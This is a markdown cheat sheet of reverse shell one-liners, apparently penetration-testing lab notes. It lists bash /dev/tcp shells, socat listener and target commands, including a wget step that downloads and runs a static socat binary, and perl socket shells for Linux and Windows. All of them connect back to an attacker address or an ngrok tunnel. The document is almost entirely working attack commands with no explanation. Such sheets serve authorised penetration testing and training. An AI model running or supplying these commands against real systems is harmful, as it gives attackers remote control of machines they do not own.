# Reverse Shell Cheat Sheet
## [tool](https://www.revshells.com/)
## bash
```console
kali@kali:~$ bash -i >& /dev/tcp/8.tcp.ngrok.io/18545 0>&1
kali@kali:~$ bash -c 'bash -i >& /dev/tcp/10.10.16.7/8888 0>&1'
kali@kali:~$ 0<&196;exec 196<>/dev/tcp/10.10.16.7/8888; sh <&196 >&196 2>&196
kali@kali:~$ /bin/bash -l > /dev/tcp/10.10.16.7/8888 0<&1 2>&1
kali@kali:~$ exec 5<> /dev/tcp/10.10.16.7/8888; cat <&5 | while read line; do $line 2>&5>&5; done
```
## [socat](https://github.com/thotrangyeuduoi/template/blob/master/note.md#socat)
```console
#local
kali@kali:~$ socat file:`tty`,raw,echo=0 TCP-L:8888
#target
kali@kali:~$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.7:8888
#binaryFile on target
kali@kali:~$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.7:8888
```
*[https://github.com/andrew-d/static-binaries]( https://github.com/andrew-d/static-binaries)*
## perl
```console
kali@kali:~$ perl -e 'use Socket;$i="10.10.16.7";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
kali@kali:~$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.7:8888");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
#NOTE: Windows only
C:\Users\offsec> perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.16.7:8888");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```